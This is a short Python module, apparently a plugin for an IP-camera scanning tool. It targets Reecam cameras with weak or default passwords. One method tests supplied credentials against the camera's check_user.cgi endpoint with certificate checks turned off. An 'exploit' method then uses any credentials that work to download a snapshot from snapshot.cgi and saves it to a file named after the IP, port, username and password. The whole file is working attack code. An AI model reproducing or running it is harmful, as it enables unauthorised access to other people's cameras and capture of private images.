import requests

from .base import WeakPasswordPOC


class ReecamWeakPassword(WeakPasswordPOC):
    product_key = 'reecam'

    def _check(self, ip, port, user, password):
        r = requests.get(f"http://{user}:{password}@{ip}:{port}/check_user.cgi",
                         headers=self.headers, timeout=self.config.timeout,
                         verify=False, stream=True)
        return r.status_code == 200

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        return self._snapshot(f"http://{user}:{password}@{ip}:{port}/snapshot.cgi",
                              f"{ip}-{port}-{user}-{password}.jpg")
